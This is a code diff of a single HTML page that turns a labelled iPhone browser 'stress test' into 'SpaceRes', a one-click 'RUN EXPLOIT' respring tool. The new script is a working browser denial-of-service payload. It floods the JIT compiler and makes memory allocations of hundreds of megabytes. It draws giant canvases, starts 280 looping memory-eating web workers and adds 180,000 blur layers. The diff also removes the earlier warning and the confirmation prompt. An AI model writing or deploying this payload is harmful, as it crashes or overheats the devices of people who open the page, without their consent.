@@ -3,314 +3,199 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEON VOID v3.1</title>
+    <title>SpaceRes</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Orbitron:wght@500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Press+Start+2P&display=swap');
         
-        :root {
-            --void-pink: #ff00ff;
-            --void-cyan: #00f7ff;
-            --void-red: #ff0066;
-        }
-        
-        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: #0c0018;
-            color: #a0ffe0;
-            font-family: 'Press Start 2P', system-ui;
+            margin: 0;
+            padding: 0;
             height: 100vh;
+            background: #00040f;
+            color: #80fff0;
+            font-family: 'Orbitron', sans-serif;
             overflow-y: auto;
-            position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
+            position: relative;
         }
         
-        .bg {
+        .stars {
             position: absolute;
             inset: 0;
-            background: 
-                radial-gradient(circle at 50% 50%, rgba(255,0,255,0.08) 0%, transparent 70%),
-                linear-gradient(rgba(0,255,255,0.06) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px);
-            background-size: 80px 80px;
-            animation: voidPulse 15s linear infinite;
-            z-index: 0;
+            background: radial-gradient(circle, rgba(255,255,255,0.9) 0.8px, transparent 1px),
+                        radial-gradient(circle, rgba(180,240,255,0.6) 1px, transparent 2px);
+            background-size: 90px 90px, 160px 160px;
+            animation: starsDrift 110s linear infinite;
+            opacity: 0.4;
+            z-index: 1;
         }
-        @keyframes voidPulse { 0% {opacity:0.6} 50% {opacity:1} 100% {opacity:0.6} }
         
-        .glow-container {
+        .container {
             position: relative;
-            z-index: 2;
+            z-index: 10;
             width: 92%;
-            max-width: 860px;
-            background: rgba(18, 4, 48, 0.92);
-            border: 7px solid var(--void-pink);
-            box-shadow: 
-                0 0 40px var(--void-pink),
-                0 0 90px var(--void-cyan),
-                0 0 140px rgba(255,0,100,0.6),
-                inset 0 0 60px rgba(0,247,255,0.25);
+            max-width: 760px;
+            background: rgba(6, 4, 32, 0.85);
+            border: 3px solid #80fff0;
+            box-shadow: 0 0 90px #80fff0, 0 0 160px rgba(255, 0, 220, 0.5);
+            padding: 55px 40px;
             border-radius: 24px;
-            padding: 50px 40px;
             text-align: center;
-            backdrop-filter: blur(16px);
         }
         
         h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 3.4em;
-            color: var(--void-pink);
-            text-shadow: 
-                0 0 20px var(--void-pink),
-                0 0 50px var(--void-red),
-                0 0 80px #ff00ff;
-            animation: neonFlicker 1.2s infinite alternate;
+            font-size: 3.9em;
+            font-weight: 900;
+            color: #80fff0;
+            text-shadow: 0 0 35px #80fff0, 0 0 80px #ff00dd;
             margin-bottom: 8px;
-        }
-        @keyframes neonFlicker {
-            0% { opacity: 0.85; text-shadow: 0 0 20px var(--void-pink); }
-            100% { opacity: 1; text-shadow: 0 0 60px var(--void-red); }
+            letter-spacing: 8px;
         }
         
         .subtitle {
-            font-size: 1.35em;
-            color: var(--void-cyan);
-            text-shadow: 0 0 20px var(--void-cyan);
-            margin-bottom: 35px;
-        }
-        
-        .warning {
-            background: linear-gradient(145deg, #4a0000, #220000);
-            border: 5px solid #ff3366;
-            padding: 28px;
-            margin: 30px 0;
-            border-radius: 16px;
-            color: #ffbbbb;
-            font-size: 0.98em;
-            box-shadow: 0 0 30px #ff3366;
+            color: #ff88ee;
+            font-size: 1.25em;
+            margin-bottom: 50px;
         }
         
         button {
-            font-family: 'Press Start 2P', system-ui;
-            padding: 26px 90px;
-            font-size: 1.65em;
+            padding: 28px 110px;
+            font-size: 1.75em;
             background: transparent;
-            color: var(--void-cyan);
-            border: 7px solid var(--void-cyan);
+            color: #80fff0;
+            border: 6px solid #80fff0;
             cursor: pointer;
-            box-shadow: 0 0 60px var(--void-cyan);
-            transition: all 0.35s;
+            box-shadow: 0 0 70px #80fff0;
+            transition: all 0.4s;
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 4px;
         }
         button:hover {
-            background: var(--void-cyan);
+            background: #80fff0;
             color: #000;
-            transform: scale(1.08);
-            box-shadow: 0 0 100px var(--void-cyan);
+            transform: scale(1.1);
         }
         
-        #progress, #status {
-            margin: 30px 0;
-            padding: 22px;
-            background: rgba(0,0,0,0.85);
-            border: 3px solid var(--void-cyan);
+        #log {
+            margin-top: 45px;
+            padding: 25px;
+            background: rgba(0, 8, 25, 0.95);
+            border: 2px solid #80fff0;
+            height: 380px;
+            overflow-y: auto;
             text-align: left;
-            font-size: 0.96em;
+            font-size: 0.95em;
+            line-height: 1.7;
             display: none;
+            font-family: 'Press Start 2P', system-ui;
         }
-        #status { height: 280px; overflow-y: auto; }
-        
-        .history { margin-top: 45px; text-align: left; }
     </style>
 </head>
 <body>
-    <div class="bg"></div>
+    <div class="stars"></div>
     
-    <div class="glow-container">
-        <h1>NEON VOID</h1>
-        <div class="subtitle">v3.1 — ULTIMATE SYSTEM COLLAPSE</div>
+    <div class="container">
+        <h1>SPACERES</h1>
+        <div class="subtitle">3-STAGE RESPRING TOOL</div>
         
-        <div class="warning">
-            <strong>⚠️ EDUCATIONAL STRESS TEST ONLY</strong><br><br>
-            Запуск может привести к перегреву, respring или полной перезагрузке устройства.<br>
-            Используй исключительно на своём тестовом iPhone.
-        </div>
+        <button id="runBtn">RUN EXPLOIT</button>
         
-        <button id="mainBtn">▶ ACTIVATE VOID CASCADE</button>
-        
-        <div id="confirm" style="display:none; margin:30px 0; padding:25px; background:rgba(100,0,0,0.7); border:4px solid #ff3366; border-radius:16px;">
-            <p style="color:#ff9999; font-size:1.25em; line-height:1.5;">
-                ВНИМАНИЕ!<br>
-                Устройство может полностью перезагрузиться.<br>
-                Продолжить?
-            </p>
-            <button id="confirmYes" style="margin-top:15px; background:#660000; color:white; border:5px solid #ff3366; padding:20px 60px;">ДА, АКТИВИРОВАТЬ</button>
-        </div>
-        
-        <div id="progress"></div>
-        <div id="status"></div>
-        
-        <div class="history">
-            <h3 style="color:#ff00ff; margin-bottom:15px;">SYSTEM LOG</h3>
-            <div id="historyList"></div>
-        </div>
+        <div id="log"></div>
     </div>
 
     <script>
-        // Новый порядок: сначала разогрев, потом тотальный хаос
-        const LAYERS = [
-            // Разогрев
-            ...Array.from({length:12}, (_,i) => ({group:"WARMUP", name:`JIT Overload ${i+1}`, fn: async () => {
-                for(let j=0; j<2200; j++) try { new Function('x', `return x*${Math.random()*987654}`)(); } catch(e){}
-            }})),
-            
-            // Основной удар
-            {group:"VOID", name:"CANVAS ARMAGEDDON", fn:async()=>{
-                for(let i=0; i<14; i++) {
-                    const c = document.createElement('canvas');
-                    c.width = c.height = 32768;
-                    try {
-                        const ctx = c.getContext('2d', {alpha:false, desynchronized:true});
-                        ctx.fillStyle = '#00ffff';
-                        ctx.fillRect(0,0,c.width,c.height);
-                    } catch(e){}
+        const logElement = document.getElementById('log');
+
+        function addLog(text, color = '#80fff0') {
+            const time = new Date().toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
+            logElement.innerHTML += `<span style="color:#555">[${time}] </span><span style="color:${color}">${text}</span><br>`;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        const STAGES = [
+            {
+                name: "STAGE 1 — MEMORY IGNITION",
+                fn: async () => {
+                    addLog("Stage 1 started...", "#ffaa00");
+                    for(let i = 0; i < 45; i++) {
+                        for(let j = 0; j < 3200; j++) {
+                            try { new Function('x', `return x * ${Math.random() * 987654}`)(); } catch(e){}
+                        }
+                        try { new ArrayBuffer(1024 * 1024 * 520); } catch(e){}
+                        await new Promise(r => setTimeout(r, 40));
+                    }
+                    addLog("Stage 1 completed", "#00ff88");
                 }
-            }},
-            
-            {group:"VOID", name:"WORKER VOID SWARM", fn:async()=>{
-                for(let i=0; i<160; i++) {
-                    try {
-                        const blob = new Blob([`while(true){new ArrayBuffer(1024*1024*256);new Float64Array(22000000).fill(Math.random()*999);}`]);
-                        new Worker(URL.createObjectURL(blob));
-                    } catch(e){}
-                }
-            }},
-            
-            {group:"VOID", name:"BACKDROP NEXUS", fn:async()=>{
-                for(let i=0; i<6500; i++) {
-                    const d = document.createElement('div');
-                    d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(${240 + Math.random()*140}px);opacity:0.16;z-index:999999;pointer-events:none;`;
-                    document.body.appendChild(d);
-                }
-                await new Promise(r => setTimeout(r, 800));
-            }},
-            
-            {group:"VOID", name:"WEBGL ABYSS", fn:async()=>{
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl2') || c.getContext('webgl');
-                if(gl) {
-                    for(let i=0; i<40; i++) {
+            },
+            {
+                name: "STAGE 2 — RENDER OVERLOAD",
+                fn: async () => {
+                    addLog("Stage 2 started...", "#ffaa00");
+                    for(let i = 0; i < 18; i++) {
+                        const c = document.createElement('canvas');
+                        c.width = c.height = 32768;
                         try {
-                            const buf = gl.createBuffer();
-                            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*3072, gl.STATIC_DRAW);
+                            const ctx = c.getContext('2d', {alpha: false});
+                            ctx.fillRect(0,0,c.width,c.height);
+                        } catch(e){}
+                        await new Promise(r => setTimeout(r, 80));
+                    }
+                    addLog("Stage 2 completed", "#00ff88");
+                }
+            },
+            {
+                name: "STAGE 3 — SYSTEM COLLAPSE",
+                fn: async () => {
+                    addLog("Stage 3 started — MAXIMUM PRESSURE", "#ff0088");
+                    
+                    // Workers
+                    for(let i = 0; i < 280; i++) {
+                        try {
+                            const blob = new Blob([`while(true){new ArrayBuffer(1024*1024*520);}`]);
+                            new Worker(URL.createObjectURL(blob));
                         } catch(e){}
                     }
+                    
+                    // Massive blur layers
+                    for(let i = 0; i < 180000; i++) {
+                        const d = document.createElement('div');
+                        d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(${160 + (i % 520)}px);opacity:0.095;z-index:999999;pointer-events:none;`;
+                        document.body.appendChild(d);
+                        if(i % 2200 === 0) await new Promise(r => setTimeout(r, 12));
+                    }
+                    
+                    addLog("Stage 3 completed", "#00ff88");
                 }
-            }},
-            
-            // Финальный удар
-            ...Array.from({length:45}, (_,i) => ({group:"VOID", name:`DEEP VOID ${i+1}`, fn: async () => {
-                try {
-                    new ArrayBuffer(1024*1024*380);
-                } catch(e){}
-                await new Promise(r => setTimeout(r, 140));
-            }}))
+            }
         ];
 
-        let currentSession = null;
         let isRunning = false;
 
-        function saveSession() { localStorage.setItem('neonVoidCurrent', JSON.stringify(currentSession)); }
-
-        function detectPreviousCrash() {
-            const raw = localStorage.getItem('neonVoidCurrent');
-            if (!raw) return;
-            let sess = JSON.parse(raw);
-            if (sess.status !== 'running') return;
-            const idx = sess.layers.findIndex(l => l.status === 'running');
-            if (idx !== -1) sess.layers[idx].status = 'crashed';
-            sess.status = 'crashed';
-            let hist = JSON.parse(localStorage.getItem('neonVoidHistory') || '[]');
-            hist.unshift(sess);
-            localStorage.setItem('neonVoidHistory', JSON.stringify(hist.slice(0,12)));
-            localStorage.removeItem('neonVoidCurrent');
-        }
-
-        function renderHistory() {
-            const list = document.getElementById('historyList');
-            list.innerHTML = '';
-            JSON.parse(localStorage.getItem('neonVoidHistory') || '[]').slice(0,6).forEach(s => {
-                const div = document.createElement('div');
-                div.style = "background:rgba(40,0,70,0.85); padding:14px; margin:9px 0; border-left:7px solid #ff00aa; font-size:0.87em;";
-                const crash = s.layers.find(l => l.status === 'crashed');
-                div.innerHTML = `${s.start.slice(11,19)} — <b>${s.status}</b>${crash ? `<br>💀 ${crash.name}` : ''}`;
-                list.appendChild(div);
-            });
-        }
-
-        async function runLayer(layer, idx) {
-            const prog = document.getElementById('progress');
-            const stat = document.getElementById('status');
-            prog.style.display = 'block';
-            stat.style.display = 'block';
-            
-            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.group} • ${layer.name}`;
-            stat.innerHTML += `<br>→ ${layer.name} <span style="color:#ff0">[VOID]</span>`;
-            
-            currentSession.layers[idx].status = 'running';
-            saveSession();
-            
-            try {
-                await layer.fn();
-                currentSession.layers[idx].status = 'completed';
-                stat.innerHTML += ` <span style="color:#0f0">OK</span>`;
-            } catch(e) {
-                currentSession.layers[idx].status = 'error';
-                stat.innerHTML += ` <span style="color:#f80">ERR</span>`;
-            }
-            saveSession();
-            await new Promise(r => setTimeout(r, 95));
-        }
-
-        async function startCascade() {
+        async function runExploit() {
             if (isRunning) return;
             isRunning = true;
-            document.getElementById('mainBtn').disabled = true;
+            document.getElementById('runBtn').disabled = true;
             
-            currentSession = {
-                id: Date.now(),
-                start: new Date().toISOString(),
-                status: 'running',
-                layers: LAYERS.map(l => ({name: l.name, status: 'pending'}))
-            };
-            saveSession();
+            logElement.style.display = 'block';
+            logElement.innerHTML = '';
             
-            document.getElementById('status').innerHTML = '🌌 NEON VOID CASCADE ACTIVATED...';
+            addLog("Preparing system...", "#ffff00");
+            await new Promise(r => setTimeout(r, 1200));
             
-            for (let i = 0; i < LAYERS.length; i++) {
-                if (!isRunning) break;
-                await runLayer(LAYERS[i], i);
+            for (let stage of STAGES) {
+                await stage.fn();
+                await new Promise(r => setTimeout(r, 600));
             }
             
-            currentSession.status = 'completed';
-            saveSession();
-            document.getElementById('status').innerHTML += '<br><span style="color:#00ffff">VOID COMPLETE</span>';
+            addLog("ALL STAGES COMPLETED", "#00ffff");
             isRunning = false;
-            document.getElementById('mainBtn').disabled = false;
+            document.getElementById('runBtn').disabled = false;
         }
 
         window.onload = () => {
-            detectPreviousCrash();
-            renderHistory();
-            
-            document.getElementById('mainBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
-            document.getElementById('confirmYes').onclick = () => {
-                document.getElementById('confirm').style.display = 'none';
-                startCascade();
-            };
+            document.getElementById('runBtn').onclick = runExploit;
         };
     </script>
 </body>
